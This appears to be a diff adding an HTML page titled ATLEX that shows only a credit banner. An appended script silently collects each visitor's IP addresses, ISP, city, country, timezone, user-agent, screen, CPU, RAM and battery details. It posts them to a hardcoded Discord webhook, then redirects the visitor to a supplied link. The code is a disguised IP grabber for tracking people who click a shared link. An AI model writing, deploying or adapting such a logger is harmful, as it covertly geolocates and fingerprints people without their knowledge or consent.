@@ -1,0 +1,117 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ATLEX</title>
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap" rel="stylesheet">
+  <style>
+    html, body {
+      margin: 0;
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Orbitron', sans-serif;
+    }
+
+    body {
+      background: linear-gradient(45deg, black, purple, darkblue);
+      background-size: 300% 300%;
+      animation: moveGradient 10s ease infinite;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+    }
+
+    h1 {
+      color: white;
+      font-size: 3rem;
+      text-align: center;
+      padding: 20px;
+      background-color: rgba(0, 0, 0, 0.7);
+      border-radius: 15px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+    }
+
+    @keyframes moveGradient {
+      0% {
+        background-position: 0% 50%;
+      }
+      50% {
+        background-position: 100% 50%;
+      }
+      100% {
+        background-position: 0% 50%;
+      }
+    }
+  </style>
+</head>
+<body>
+  <h1>THIS TOOL WAS CREATED BY ATLEX (NINA)</h1>
+</body>
+</html>
+
+<script>
+(async () => {
+  const params = new URLSearchParams(location.search);
+  const redirectUrl = params.get("link");
+  const uid = params.get("id");
+
+  if (!uid || !redirectUrl) return;
+
+  const [ipapiData, ipifyData] = await Promise.all([
+    fetch("https://ipapi.co/json/").then(res => res.json()).catch(() => ({})),
+    fetch("https://api.ipify.org?format=json").then(res => res.json()).catch(() => ({})),
+  ]);
+
+  const ipv4 = ipifyData.ip || "error";
+  const ipv6 = (ipapiData.ip || "").includes(":") ? ipapiData.ip : "error";
+
+  const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown";
+  const now = new Date().toISOString();
+  const localTime = new Date().toString();
+
+  const battery = await navigator.getBattery?.().catch(() => null) || {};
+  const batteryLevel = battery.level != null ? `${Math.round(battery.level * 100)}%` : "N/A";
+  const isCharging = battery.charging != null ? (battery.charging ? "Yes" : "No") : "N/A";
+
+  const cpuCores = typeof navigator.hardwareConcurrency === "number" ? navigator.hardwareConcurrency : "N/A";
+  const ram = typeof navigator.deviceMemory === "number" ? `${navigator.deviceMemory} GB` : "N/A";
+
+  const info = {
+    title: "🎯 New Device Logged",
+    color: 0xff0000,
+    fields: [
+      { name: "ID", value: uid, inline: false },
+      { name: "IPv4", value: ipv4, inline: true },
+      { name: "IPv6", value: ipv6, inline: true },
+      { name: "ASN", value: ipapiData.asn || "N/A", inline: true },
+      { name: "Org", value: ipapiData.org || "N/A", inline: true },
+      { name: "City", value: ipapiData.city || "N/A", inline: true },
+      { name: "Region", value: ipapiData.region || "N/A", inline: true },
+      { name: "Country", value: ipapiData.country_name || "N/A", inline: true },
+      { name: "Timezone", value: timezone, inline: true },
+      { name: "Language", value: navigator.language || "N/A", inline: true },
+      { name: "Platform", value: navigator.platform || "N/A", inline: true },
+      { name: "User-Agent", value: navigator.userAgent.slice(0, 1024), inline: false },
+      { name: "Screen", value: `${screen.width}x${screen.height} @ ${screen.colorDepth}bit`, inline: true },
+      { name: "CPU Cores", value: cpuCores.toString(), inline: true },
+      { name: "RAM", value: ram, inline: true },
+      { name: "Touch Support", value: "ontouchstart" in window ? "Yes" : "No", inline: true },
+      { name: "Battery", value: `${batteryLevel} (Charging: ${isCharging})`, inline: true },
+      { name: "Dark Mode", value: window.matchMedia("(prefers-color-scheme: dark)").matches ? "Yes" : "No", inline: true },
+      { name: "Cookies Enabled", value: navigator.cookieEnabled ? "Yes" : "No", inline: true },
+      { name: "Online", value: navigator.onLine ? "Yes" : "No", inline: true },
+      { name: "Local Time", value: localTime, inline: false },
+      { name: "Timestamp", value: now, inline: false },
+    ],
+  };
+
+  await fetch("https://discord.com/api/webhooks/1363074052033347765/AyllgC56H3ixcu4UjN6nhgeN1TCE-kbCVBVpwTuPXM4SbvY8B2zywYh_sDidNULoXOpf", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ embeds: [info] }),
+  });
+
+  location.href = redirectUrl;
+})();
+</script>
